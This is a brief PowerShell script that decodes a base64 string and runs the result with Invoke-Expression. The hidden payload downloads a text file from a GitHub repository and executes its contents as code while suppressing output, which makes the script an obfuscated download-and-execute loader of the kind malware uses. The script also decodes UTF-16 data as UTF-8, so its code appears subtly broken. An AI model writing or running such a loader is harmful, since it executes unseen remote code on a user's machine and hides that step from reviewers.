# This PowerShell script decodes a base64 encoded command and executes it

# Base64 encoded command
$encoded_command = "CgAKACQAdQByAGwAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAcwBrAHcAdwAvAEEAdABsAGEAcwAvAHIAYQB3AC8AbQBhAGkAbgAvAHMAdQBwAHAAbwByAHQALgB0AHgAdAAiADsACgAkAEMAbwBuAHQAZQBuAHQAIAA9ACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJAB1AHIAbAApAC4AQwBvAG4AdABlAG4AdAA7AAoASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACgAJABDAG8AbgB0AGUAbgB0ACkAIAB8ACAATwB1AHQALQBOAHUAbABsADsACgAKAA=="

# Decode the base64 encoded command
$Command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_command))

# Execute the decoded command
Invoke-Expression -Command $Command

